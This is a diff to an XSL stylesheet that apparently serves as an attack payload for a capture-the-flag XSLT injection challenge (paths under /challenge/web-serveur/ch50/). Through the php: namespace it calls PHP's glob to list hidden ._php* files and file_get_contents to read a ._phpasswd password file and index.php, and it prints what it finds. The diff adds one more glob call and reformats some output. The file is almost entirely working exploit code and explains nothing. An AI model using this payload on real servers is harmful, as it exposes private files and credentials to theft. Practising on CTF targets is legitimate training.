@@ -2,6 +2,7 @@
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
 xmlns:php="http://php.net/xsl"              
 >	
+<xsl:param  name="shandle"     select="php:function('glob','/challenge/web-serveur/ch50/._php*')"/>
 <xsl:param  name="shandlea"    select="php:function('glob','/challenge/web-serveur/ch50/._phpa*')"/>
 <xsl:param  name="shandleb"    select="php:function('glob','/challenge/web-serveur/ch50/._phpb*')" />
 <xsl:param  name="shandlec"    select="php:function('glob','/challenge/web-serveur/ch50/._phpc*')" />
@@ -59,6 +60,7 @@ xmlns:php="http://php.net/xsl"
 <xsl:param  name="strscand"   select="php:function('file_get_contents','/challenge/web-serveur/ch50/._phpasswd')" /> 
 <xsl:param  name="header"     select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')" />
 <xsl:template match="/">	
+  ._php*:<xsl:value-of select="$shandle"/>
   SCANDIR0 ._phpa*:<xsl:value-of select="$shandlea"/> 
   SCANDIR0 .b*:<xsl:value-of select="$shandleb"/> 
   SCANDIR0 .c*:<xsl:value-of select="$shandlec"/> 
@@ -125,7 +127,9 @@ xmlns:php="http://php.net/xsl"
 <p>
 <xsl:value-of select="description"/>
 <span style="font-style:italic">
-(<xsl:value-of select="prct"/>%)
+(
+<xsl:value-of select="prct"/>
+%)
 </span>
 </p>
 </div>
